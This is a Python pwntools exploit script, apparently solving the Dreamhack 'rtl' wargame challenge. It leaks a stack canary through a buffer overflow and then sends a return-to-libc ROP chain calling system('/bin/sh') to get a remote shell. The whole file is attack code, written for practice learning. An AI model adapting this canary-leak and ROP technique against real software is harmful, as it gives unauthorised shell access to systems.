#원격 바이너리
from pwn import *

#p = process("./rtl")
p = remote('host2.dreamhack.games', 8304)
e = ELF("./rtl")


def slog(name, addr): return success(": ".join([name, hex(addr)]))


# [1] Leak canary
buf = b"A"*0x39
p.sendafter("Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b"\x00"+p.recvn(7))
slog("canary", cnry)

# [2] Exploit
#system_plt = e.plt["system"]
system_plt = 0x4005d0
binsh = 0x400874
pop_rdi = 0x0000000000400853
ret = 0x0000000000400285

payload = b"A"*0x38 + p64(cnry) + b"B"*0x8
payload += p64(ret)  # align stack to prevent errors caused by movaps
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

pause()
p.sendafter("Buf: ", payload)

p.interactive()